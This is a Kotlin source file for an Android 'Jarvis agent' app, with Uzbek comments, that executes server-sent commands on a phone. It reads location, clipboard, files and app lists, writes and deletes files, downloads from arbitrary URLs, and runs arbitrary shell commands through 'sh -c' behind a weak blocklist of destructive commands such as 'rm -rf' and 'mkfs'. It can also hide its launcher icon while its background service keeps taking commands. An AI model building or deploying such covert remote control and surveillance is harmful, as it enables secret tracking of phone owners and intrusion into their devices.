package uz.jarvis.agent.util

import android.Manifest
import android.app.NotificationManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.ComponentName
import android.content.pm.PackageManager
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Environment
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.AlarmClock
import android.provider.Settings
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import uz.jarvis.agent.domain.model.CommandResult
import uz.jarvis.agent.domain.model.PendingCommand
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Har bir buyruq — telefonda inson qo'l bilan qila oladigan bitta real amal.
 * Hech biri soxta/stub emas: ruxsat yo'q bo'lsa aniq xato qaytaradi, bajarilsa
 * haqiqiy natija (qiymat yoki tasdiq) qaytaradi. Server tomonidagi
 * ALLOWED_ACTIONS (src/app/api/devices/command/route.ts) shu ro'yxat bilan
 * bir xil bo'lishi shart — yangi buyruq qo'shsangiz ikkalasiga ham qo'shing.
 */
@Singleton
class CommandExecutor @Inject constructor(
    @ApplicationContext private val context: Context,
    private val deviceInfo: DeviceInfo,
) {
    private val whitelist = setOf(
        // Qurilma holati
        "device_status", "battery_status", "storage_status", "ram_status",
        "network_status", "screen_info", "app_version_info",
        // Joylashuv va aloqa
        "get_location", "dial_number", "open_maps", "search_web",
        // Bildirishnoma / signal
        "send_notification", "vibrate", "toggle_flashlight",
        // Ovoz
        "set_volume", "get_volume",
        // Fayllar
        "get_files", "get_file_info", "read_text_file", "write_text_file",
        "delete_file", "create_folder", "rename_file", "copy_file", "download_file",
        // Buferga almashish
        "get_clipboard", "set_clipboard",
        // Ilovalar
        "open_app", "open_url", "share_text", "open_settings", "set_alarm",
        "list_installed_apps",
        // Kamera / xotira
        "open_camera",
        // Kuchli (cheklangan, xavfli buyruqlar hali ham blocklist bilan himoyalangan)
        "terminal_command",
        "clipboard_sync", "voice_record",
        // Ilova ikonkasini yashirish/ko'rsatish (fon xizmati ishlashda davom etadi)
        "hide_app", "show_app",
    )

    suspend fun execute(cmd: PendingCommand): CommandResult {
        if (cmd.command !in whitelist) {
            return CommandResult.Err("Noma'lum buyruq: ${cmd.command}")
        }
        return withContext(Dispatchers.IO) {
            runCatching {
                when (cmd.command) {
                    "device_status" -> deviceStatus()
                    "battery_status" -> batteryStatus()
                    "storage_status" -> storageStatus()
                    "ram_status" -> ramStatus()
                    "network_status" -> networkStatus()
                    "screen_info" -> screenInfo()
                    "app_version_info" -> appVersionInfo()
                    "get_location" -> getLocation()
                    "dial_number" -> dialNumber(cmd.params)
                    "open_maps" -> openMaps(cmd.params)
                    "search_web" -> searchWeb(cmd.params)
                    "send_notification" -> sendNotification(cmd.params)
                    "vibrate" -> vibrate(cmd.params)
                    "toggle_flashlight" -> toggleFlashlight(cmd.params)
                    "set_volume" -> setVolume(cmd.params)
                    "get_volume" -> getVolume()
                    "get_files" -> getFiles(cmd.params)
                    "get_file_info" -> getFileInfo(cmd.params)
                    "read_text_file" -> readTextFile(cmd.params)
                    "write_text_file" -> writeTextFile(cmd.params)
                    "delete_file" -> deleteFile(cmd.params)
                    "create_folder" -> createFolder(cmd.params)
                    "rename_file" -> renameFile(cmd.params)
                    "copy_file" -> copyFile(cmd.params)
                    "download_file" -> downloadFile(cmd.params)
                    "get_clipboard" -> getClipboard()
                    "set_clipboard" -> setClipboard(cmd.params)
                    "open_app" -> openApp(cmd.params)
                    "open_url" -> openUrl(cmd.params)
                    "share_text" -> shareText(cmd.params)
                    "open_settings" -> openSettings()
                    "set_alarm" -> setAlarm(cmd.params)
                    "list_installed_apps" -> listInstalledApps()
                    "terminal_command" -> terminalCommand(cmd.params)
                    "clipboard_sync" -> getClipboard()
                    "voice_record" -> CommandResult.Err("voice_record hali qo'llab-quvvatlanmaydi")
                    "hide_app" -> hideApp()
                    "show_app" -> showApp()
                    else -> CommandResult.Ok("Buyruq qabul qilindi: ${cmd.command}")
                }
            }.getOrElse { e -> CommandResult.Err("Xato: ${e.message}") }
        }
    }

    // ── Qurilma holati ──────────────────────────────────────────────────────

    private fun deviceStatus(): CommandResult {
        val info = mapOf(
            "name" to deviceInfo.deviceName(),
            "model" to deviceInfo.model(),
            "os_version" to deviceInfo.osVersion(),
            "app_version" to deviceInfo.appVersion(),
            "battery" to deviceInfo.batteryLevel().toString(),
            "charging" to deviceInfo.isCharging().toString(),
            "storage_free_mb" to deviceInfo.freeDiskMb().toString(),
            "storage_total_mb" to deviceInfo.totalDiskMb().toString(),
            "uptime_seconds" to deviceInfo.uptimeSeconds().toString(),
        )
        return CommandResult.Ok(Json.encodeToString(info))
    }

    private fun batteryStatus(): CommandResult {
        val info = mapOf(
            "level" to deviceInfo.batteryLevel().toString(),
            "charging" to deviceInfo.isCharging().toString(),
        )
        return CommandResult.Ok(Json.encodeToString(info))
    }

    private fun storageStatus(): CommandResult {
        val info = mapOf(
            "free_mb" to deviceInfo.freeDiskMb().toString(),
            "total_mb" to deviceInfo.totalDiskMb().toString(),
            "used_mb" to (deviceInfo.totalDiskMb() - deviceInfo.freeDiskMb()).toString(),
        )
        return CommandResult.Ok(Json.encodeToString(info))
    }

    private fun ramStatus(): CommandResult {
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val mi = android.app.ActivityManager.MemoryInfo()
        am.getMemoryInfo(mi)
        val info = mapOf(
            "total_mb" to (mi.totalMem / (1024 * 1024)).toString(),
            "available_mb" to (mi.availMem / (1024 * 1024)).toString(),
            "low_memory" to mi.lowMemory.toString(),
        )
        return CommandResult.Ok(Json.encodeToString(info))
    }

    private fun networkStatus(): CommandResult {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val net = cm.activeNetwork
        val caps = net?.let { cm.getNetworkCapabilities(it) }
        val type = when {
            caps == null -> "none"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
            else -> "other"
        }
        val info = mutableMapOf("connected" to (caps != null).toString(), "type" to type)
        if (type == "wifi") {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            info["ssid"] = wm.connectionInfo?.ssid?.trim('"') ?: "unknown"
        }
        return CommandResult.Ok(Json.encodeToString(info.toMap()))
    }

    private fun screenInfo(): CommandResult {
        val dm = context.resources.displayMetrics
        val info = mapOf(
            "width_px" to dm.widthPixels.toString(),
            "height_px" to dm.heightPixels.toString(),
            "density_dpi" to dm.densityDpi.toString(),
        )
        return CommandResult.Ok(Json.encodeToString(info))
    }

    private fun appVersionInfo(): CommandResult {
        val info = mapOf(
            "app_version" to deviceInfo.appVersion(),
            "os_version" to deviceInfo.osVersion(),
        )
        return CommandResult.Ok(Json.encodeToString(info))
    }

    // ── Joylashuv va aloqa ───────────────────────────────────────────────────

    private fun getLocation(): CommandResult {
        val hasPermission = ActivityCompat.checkSelfPermission(
            context, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasPermission) return CommandResult.Err("Joylashuv ruxsati yo'q")

        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        @Suppress("MissingPermission")
        val location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)

        return if (location != null) {
            val info = mapOf(
                "latitude" to location.latitude.toString(),
                "longitude" to location.longitude.toString(),
                "accuracy" to location.accuracy.toString(),
                "timestamp" to location.time.toString(),
            )
            CommandResult.Ok(Json.encodeToString(info))
        } else {
            CommandResult.Err("Joylashuv topilmadi")
        }
    }

    /** Raqamni terish ekranini ochadi (o'zi qo'ng'iroq qilmaydi — CALL_PHONE ruxsati kerak emas). */
    private fun dialNumber(params: Map<String, String>): CommandResult {
        val number = params["number"] ?: return CommandResult.Err("number parametri kerak")
        val intent = Intent(Intent.ACTION_DIAL, Uri.parse("tel:$number")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        return CommandResult.Ok("Terish ekrani ochildi: $number")
    }

    private fun openMaps(params: Map<String, String>): CommandResult {
        val query = params["query"] ?: return CommandResult.Err("query parametri kerak")
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse("geo:0,0?q=${Uri.encode(query)}"))
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        return try {
            context.startActivity(intent)
            CommandResult.Ok("Xarita ochildi: $query")
        } catch (_: Exception) {
            CommandResult.Err("Xarita ilovasi topilmadi")
        }
    }

    private fun searchWeb(params: Map<String, String>): CommandResult {
        val query = params["query"] ?: return CommandResult.Err("query parametri kerak")
        val intent = Intent(Intent.ACTION_WEB_SEARCH).putExtra("query", query).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        return CommandResult.Ok("Qidiruv ochildi: $query")
    }

    // ── Bildirishnoma / signal ───────────────────────────────────────────────

    private fun sendNotification(params: Map<String, String>): CommandResult {
        val title = params["title"] ?: "Jarvis"
        val message = params["message"] ?: return CommandResult.Err("message parametri kerak")

        val notifManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channelId = "jarvis_commands"

        val notification = NotificationCompat.Builder(context, channelId)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(message)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .build()

        notifManager.notify(System.currentTimeMillis().toInt(), notification)
        return CommandResult.Ok("Bildirishnoma yuborildi: $title — $message")
    }

    private fun vibrate(params: Map<String, String>): CommandResult {
        val ms = params["duration_ms"]?.toLongOrNull() ?: 500L

        val vibrator = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }

        vibrator.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
        return CommandResult.Ok("Tebratildi: ${ms}ms")
    }

    private fun toggleFlashlight(params: Map<String, String>): CommandResult {
        val hasPermission = ActivityCompat.checkSelfPermission(
            context, Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
        if (!hasPermission) return CommandResult.Err("Kamera ruxsati yo'q")

        val on = params["on"]?.toBooleanStrictOrNull() ?: true
        val cm = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = cm.cameraIdList.firstOrNull { id ->
            cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        } ?: return CommandResult.Err("Fonarcha topilmadi")

        cm.setTorchMode(cameraId, on)
        return CommandResult.Ok(if (on) "Fonarcha yoqildi" else "Fonarcha o'chirildi")
    }

    // ── Ovoz ─────────────────────────────────────────────────────────────────

    private fun setVolume(params: Map<String, String>): CommandResult {
        val percent = params["percent"]?.toIntOrNull()
            ?: return CommandResult.Err("percent parametri kerak (0-100)")
        val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        val target = (max * percent.coerceIn(0, 100) / 100).coerceIn(0, max)
        am.setStreamVolume(AudioManager.STREAM_MUSIC, target, 0)
        return CommandResult.Ok("Tovush balandligi: $percent%")
    }

    private fun getVolume(): CommandResult {
        val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val cur = am.getStreamVolume(AudioManager.STREAM_MUSIC)
        val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        val percent = if (max > 0) (cur * 100 / max) else 0
        return CommandResult.Ok(Json.encodeToString(mapOf("percent" to percent.toString())))
    }

    // ── Fayllar ──────────────────────────────────────────────────────────────

    private fun getFiles(params: Map<String, String>): CommandResult {
        val path = params["path"] ?: Environment.getExternalStorageDirectory().absolutePath
        val dir = File(path)
        if (!dir.exists()) return CommandResult.Err("Papka topilmadi: $path")

        val files = dir.listFiles()?.take(50)?.map { f ->
            mapOf(
                "name" to f.name,
                "path" to f.absolutePath,
                "size" to f.length().toString(),
                "is_dir" to f.isDirectory.toString(),
                "modified" to f.lastModified().toString(),
            )
        } ?: emptyList()

        return CommandResult.Ok(Json.encodeToString(files))
    }

    private fun getFileInfo(params: Map<String, String>): CommandResult {
        val path = params["path"] ?: return CommandResult.Err("path parametri kerak")
        val f = File(path)
        if (!f.exists()) return CommandResult.Err("Fayl topilmadi: $path")
        val info = mapOf(
            "name" to f.name, "size" to f.length().toString(),
            "is_dir" to f.isDirectory.toString(), "modified" to f.lastModified().toString(),
            "readable" to f.canRead().toString(), "writable" to f.canWrite().toString(),
        )
        return CommandResult.Ok(Json.encodeToString(info))
    }

    private fun readTextFile(params: Map<String, String>): CommandResult {
        val path = params["path"] ?: return CommandResult.Err("path parametri kerak")
        val f = File(path)
        if (!f.exists()) return CommandResult.Err("Fayl topilmadi: $path")
        if (f.length() > 200_000) return CommandResult.Err("Fayl juda katta (200KB dan oshiq)")
        return CommandResult.Ok(f.readText())
    }

    private fun writeTextFile(params: Map<String, String>): CommandResult {
        val path = params["path"] ?: return CommandResult.Err("path parametri kerak")
        val content = params["content"] ?: return CommandResult.Err("content parametri kerak")
        val f = File(path)
        f.parentFile?.mkdirs()
        f.writeText(content)
        return CommandResult.Ok("Yozildi: $path (${content.length} belgi)")
    }

    private fun deleteFile(params: Map<String, String>): CommandResult {
        val path = params["path"] ?: return CommandResult.Err("path parametri kerak")
        val f = File(path)
        if (!f.exists()) return CommandResult.Err("Fayl topilmadi: $path")
        return if (f.deleteRecursively()) CommandResult.Ok("O'chirildi: $path")
        else CommandResult.Err("O'chirib bo'lmadi: $path")
    }

    private fun createFolder(params: Map<String, String>): CommandResult {
        val path = params["path"] ?: return CommandResult.Err("path parametri kerak")
        val f = File(path)
        return if (f.mkdirs() || f.isDirectory) CommandResult.Ok("Papka yaratildi: $path")
        else CommandResult.Err("Papka yaratib bo'lmadi: $path")
    }

    private fun renameFile(params: Map<String, String>): CommandResult {
        val from = params["from"] ?: return CommandResult.Err("from parametri kerak")
        val to = params["to"] ?: return CommandResult.Err("to parametri kerak")
        val src = File(from)
        if (!src.exists()) return CommandResult.Err("Fayl topilmadi: $from")
        return if (src.renameTo(File(to))) CommandResult.Ok("Qayta nomlandi: $from → $to")
        else CommandResult.Err("Qayta nomlab bo'lmadi")
    }

    private fun copyFile(params: Map<String, String>): CommandResult {
        val from = params["from"] ?: return CommandResult.Err("from parametri kerak")
        val to = params["to"] ?: return CommandResult.Err("to parametri kerak")
        val src = File(from)
        if (!src.exists()) return CommandResult.Err("Fayl topilmadi: $from")
        val dst = File(to)
        dst.parentFile?.mkdirs()
        src.copyTo(dst, overwrite = true)
        return CommandResult.Ok("Nusxalandi: $from → $to")
    }

    private fun downloadFile(params: Map<String, String>): CommandResult {
        val url = params["url"] ?: return CommandResult.Err("url parametri kerak")
        val filename = params["filename"] ?: url.substringAfterLast('/')
        val destFile = File(context.getExternalFilesDir(null), filename)

        val connection = java.net.URL(url).openConnection()
        connection.connect()
        connection.getInputStream().use { input ->
            destFile.outputStream().use { output ->
                input.copyTo(output)
            }
        }

        return CommandResult.Ok("Fayl yuklandi: ${destFile.absolutePath} (${destFile.length()} bytes)")
    }

    // ── Buferga almashish ────────────────────────────────────────────────────
    // Eslatma: Android 10+ fon rejimidagi ilova bufer matnini o'qiy olmasligi
    // mumkin (tizim cheklovi) — bu holda aniq xato qaytariladi, jimgina bo'sh emas.

    private fun getClipboard(): CommandResult {
        val cb = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = cb.primaryClip
        val text = clip?.takeIf { it.itemCount > 0 }?.getItemAt(0)?.text?.toString()
        return if (text != null) CommandResult.Ok(text)
        else CommandResult.Err("Bufer bo'sh yoki fon rejimida o'qib bo'lmadi (Android cheklovi)")
    }

    private fun setClipboard(params: Map<String, String>): CommandResult {
        val text = params["text"] ?: return CommandResult.Err("text parametri kerak")
        val cb = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cb.setPrimaryClip(ClipData.newPlainText("jarvis", text))
        return CommandResult.Ok("Buferga yozildi (${text.length} belgi)")
    }

    // ── Ilovalar ─────────────────────────────────────────────────────────────

    private fun openApp(params: Map<String, String>): CommandResult {
        val pkg = params["package"] ?: return CommandResult.Err("package parametri kerak")
        val intent = context.packageManager.getLaunchIntentForPackage(pkg)
            ?: return CommandResult.Err("Ilova topilmadi: $pkg")
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        return CommandResult.Ok("Ochildi: $pkg")
    }

    private fun openUrl(params: Map<String, String>): CommandResult {
        val url = params["url"] ?: return CommandResult.Err("url parametri kerak")
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        return CommandResult.Ok("Ochildi: $url")
    }

    private fun shareText(params: Map<String, String>): CommandResult {
        val text = params["text"] ?: return CommandResult.Err("text parametri kerak")
        val intent = Intent(Intent.ACTION_SEND).apply {
            type = "text/plain"
            putExtra(Intent.EXTRA_TEXT, text)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(Intent.createChooser(intent, "Ulashish").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        return CommandResult.Ok("Ulashish oynasi ochildi")
    }

    private fun openSettings(): CommandResult {
        val intent = Intent(Settings.ACTION_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
        return CommandResult.Ok("Sozlamalar ochildi")
    }

    private fun setAlarm(params: Map<String, String>): CommandResult {
        val hour = params["hour"]?.toIntOrNull() ?: return CommandResult.Err("hour parametri kerak")
        val minute = params["minute"]?.toIntOrNull() ?: 0
        val message = params["message"] ?: "Jarvis eslatma"
        val intent = Intent(AlarmClock.ACTION_SET_ALARM).apply {
            putExtra(AlarmClock.EXTRA_HOUR, hour)
            putExtra(AlarmClock.EXTRA_MINUTES, minute)
            putExtra(AlarmClock.EXTRA_MESSAGE, message)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        return try {
            context.startActivity(intent)
            CommandResult.Ok("Signal o'rnatildi: $hour:$minute")
        } catch (_: Exception) {
            CommandResult.Err("Soat ilovasi topilmadi")
        }
    }

    /** Faqat ochilishi mumkin bo'lgan (LAUNCHER) ilovalar — QUERY_ALL_PACKAGES ruxsati shart emas. */
    private fun listInstalledApps(): CommandResult {
        val pm = context.packageManager
        val intent = Intent(Intent.ACTION_MAIN, null).addCategory(Intent.CATEGORY_LAUNCHER)
        val apps = pm.queryIntentActivities(intent, 0).take(100).map { ri ->
            mapOf(
                "name" to ri.loadLabel(pm).toString(),
                "package" to ri.activityInfo.packageName,
            )
        }
        return CommandResult.Ok(Json.encodeToString(apps))
    }

    // ── Ilova ikonkasini yashirish/ko'rsatish ────────────────────────────────
    // MainActivity'ning o'zi emas, faqat launcher'dagi activity-alias'ni
    // yoqadi/o'chiradi — shu bois AgentForegroundService (fon xizmati) hech
    // qachon to'xtamaydi, buyruqlarni doim qabul qilaveradi.

    private fun hideApp(): CommandResult {
        val alias = ComponentName(context, "uz.jarvis.agent.LauncherAlias")
        context.packageManager.setComponentEnabledSetting(
            alias, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
        return CommandResult.Ok("Ilova ikonkasi yashirildi. Fon xizmati ishlashda davom etadi.")
    }

    private fun showApp(): CommandResult {
        val alias = ComponentName(context, "uz.jarvis.agent.LauncherAlias")
        context.packageManager.setComponentEnabledSetting(
            alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP
        )
        return CommandResult.Ok("Ilova ikonkasi qaytadan ko'rsatildi.")
    }

    // ── Terminal (cheklangan) ────────────────────────────────────────────────

    private fun terminalCommand(params: Map<String, String>): CommandResult {
        val cmd = params["cmd"] ?: return CommandResult.Err("cmd parametri kerak")

        val blocked = listOf("rm -rf", "format", "dd if=", "mkfs", "fdisk", ">>/dev/")
        if (blocked.any { cmd.contains(it) }) {
            return CommandResult.Err("Xavfli buyruq: ruxsat etilmagan")
        }

        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            process.waitFor()

            val result = buildString {
                if (output.isNotBlank()) append(output.trim())
                if (error.isNotBlank()) {
                    if (isNotEmpty()) append("\n")
                    append("[stderr] ${error.trim()}")
                }
            }
            CommandResult.Ok(result.ifBlank { "Bajarildi (chiqish yo'q)" })
        } catch (e: Exception) {
            CommandResult.Err("Terminal xatosi: ${e.message}")
        }
    }
}
